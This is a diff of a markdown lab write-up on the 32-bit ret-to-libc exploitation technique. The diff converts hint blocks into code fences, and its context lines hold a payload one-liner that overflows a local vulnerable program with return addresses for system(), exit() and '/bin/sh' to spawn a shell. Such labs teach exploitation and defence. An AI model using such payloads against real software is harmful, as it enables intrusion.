@@ -13,10 +13,10 @@ The purpose of this lab is to familiarize with a ret-to-libc technique, which is
 
 ## Overview
 
-{% hint style="info" %}
+```
 * The ret-to-libc technique is applicable to \*nix systems.
 * This lab is only concerned with 32-bit architecture.
-{% endhint %}
+```
 
 In a standard stack-based buffer overflow, an attacker writes their shellcode into the vulnerable program's stack and executes it on the stack.&#x20;
 
@@ -211,9 +211,9 @@ Once executed, we can observe how `/bin/sh` gets executed:
 
 Let's see if the exploit works outside gdb:
 
-{% hint style="warning" %}
+```
 Addresses of `system()`, `exit()` and `/bin/sh` used in the below payload are different to those captured in earlier screenshots due to a rebooted VM.
-{% endhint %}
+```
 
 ```python
 ./vulnerable `python -c 'print("A"*16 + "\x40\xe0\xe0\xb7" + "\x90\xb3\xf0\xb7" + "\x3c\x53\xf5\xb7")'`
